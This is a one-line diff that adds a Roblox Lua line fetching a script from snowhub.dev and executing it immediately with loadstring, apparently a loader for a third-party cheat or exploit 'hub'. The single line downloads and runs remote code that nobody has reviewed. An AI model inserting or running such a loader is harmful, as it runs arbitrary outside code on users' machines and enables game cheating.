@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://snowhub.dev/script.lua", true))()
